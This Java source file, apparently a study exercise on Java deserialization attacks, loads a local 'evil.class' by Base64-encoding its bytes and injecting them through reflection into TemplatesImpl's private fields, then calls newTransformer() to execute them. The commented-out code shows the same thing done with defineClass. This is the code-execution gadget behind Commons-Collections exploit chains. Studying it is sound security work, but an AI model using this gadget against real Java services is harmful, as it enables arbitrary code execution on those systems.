package com.Fc0;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class Main {
    public static <T> void setValue(TemplatesImpl obj,String fname,T newf) throws Exception {
        Field filed = TemplatesImpl.class.getDeclaredField(fname);
        filed.setAccessible(true);
        filed.set(obj,newf);
    }//利用反射设置TemplatesImpl的私有属性

    public static void main(String[] args) throws Exception {
        File file = new File("D:\\JavaSec\\CC1\\src\\main\\java\\com\\Fc0\\evil.class");
        FileInputStream filein = new FileInputStream(file);
        byte[] bytess = new byte[(int)file.length()];
        filein.read(bytess);
        String base64 = new String(Base64.getEncoder().encode(bytess));
        System.out.println(base64);

        String evilbase64 =  base64;//要加载的恶意类
        byte[] evilbytes = Base64.getDecoder().decode(evilbase64);

//        //直接使用defineClass加载字节码
//        Method defclass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//        defclass.setAccessible(true);
//        Class evilclass = (Class) defclass.invoke(ClassLoader.getSystemClassLoader(),evilbytes,0,evilbytes.length);
//        evilclass.newInstance();

        //使用TemplatesImpl加载字节码
        byte[][] evilbytes1 = new byte[][]{evilbytes};
        TemplatesImpl tempobj = new TemplatesImpl();
        setValue(tempobj,"_name","Fc0");
        setValue(tempobj,"_bytecodes",evilbytes1);
        setValue(tempobj,"_tfactory",new TransformerFactoryImpl());
        tempobj.newTransformer();//执行newTransformer方法
    }
}